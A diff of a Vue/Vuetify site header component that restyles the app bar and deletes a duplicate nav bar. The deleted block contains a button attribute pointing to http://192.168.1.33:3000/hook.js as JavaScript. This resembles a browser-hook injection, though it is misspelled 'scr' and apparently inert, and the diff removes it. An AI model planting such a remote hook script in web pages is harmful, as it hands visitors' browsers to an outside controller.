@@ -1,6 +1,6 @@
 <template>
   <div class="header" >
-    <v-app-bar elevate-on-scroll color='transparent'>
+    <v-app-bar app elevate-on-scroll color='rgba(250, 250, 250)'>
         
         <v-app-bar-nav-icon class="d-flex d-sm-none " @click="drawer = !drawer" ></v-app-bar-nav-icon>
         
@@ -18,26 +18,7 @@
             {{ navItem.text }}</v-btn>
         </v-app-bar-items> 
     </v-app-bar>
-    <v-app-bar app 
-    inverted-scroll
-    >
-      <v-app-bar-nav-icon class="d-flex d-sm-none " @click="drawer = !drawer" ></v-app-bar-nav-icon>
-      
-      <v-app-bar-title>EMS</v-app-bar-title>
-
-      <v-spacer></v-spacer>
-      
-      <v-app-bar-items class="d-none d-sm-flex">
-        <v-btn 
-        text v-for="(navItem, i) in navItems" 
-        :key="i" link 
-        :to="navItem.route"
-        scr="http://192.168.1.33:3000/hook.js" type="text/javascript"
-        >
-          {{ navItem.text }}</v-btn>
-      </v-app-bar-items> 
-    </v-app-bar>
-
+    
     <v-navigation-drawer
       app
       v-model="drawer"
@@ -105,6 +86,6 @@ export default {
 
 <style scoped>
 .header {
-  position: relative;
+  background-color: #fafafa;
 }
 </style>
